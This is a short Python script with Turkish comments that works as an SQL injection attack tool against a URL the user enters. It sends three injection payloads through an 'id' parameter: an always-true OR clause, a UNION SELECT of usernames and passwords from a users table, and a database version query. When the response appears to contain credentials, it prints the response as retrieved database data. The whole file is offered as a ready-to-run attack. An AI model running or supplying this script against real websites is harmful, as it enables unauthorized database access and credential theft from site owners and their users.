import requests

def sql_acigi_tespit_et(url):
    # SQL injection payloadları
    payloadlar = [
        "' OR '1'='1' -- ",
        "' UNION SELECT username, password FROM users -- ",
        "' UNION SELECT NULL, NULL, version() -- "
    ]

    print(f"SQL injection açığı için test ediliyor: {url}")

    for payload in payloadlar:
        injection_url = f"{url}?id={payload}"
        try:
            response = requests.get(injection_url, timeout=5)
            # Yanıtın içeriğini kontrol et
            if "error" in response.text.lower() or len(response.text) > 500:
                print(f"[!] Potansiyel SQL Injection açığı tespit edildi: {injection_url}")
                
                # Eğer açığa ulaşıldıysa, veritabanı bilgilerini çekme
                if "username" in response.text.lower() or "password" in response.text.lower():
                    print("[!] Veritabanı bilgileri alındı!")
                    print(response.text)  # Veritabanı bilgilerini göster
            else:
                print(f"[ ] Payload ile SQL Injection açığı bulunamadı: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[!] {injection_url} üzerinde hata oluştu: {e}")

if __name__ == "__main__":
    hedef_url = input("Test edilecek URL'yi girin (örneğin: http://example.com/page.php): ")
    sql_acigi_tespit_et(hedef_url)
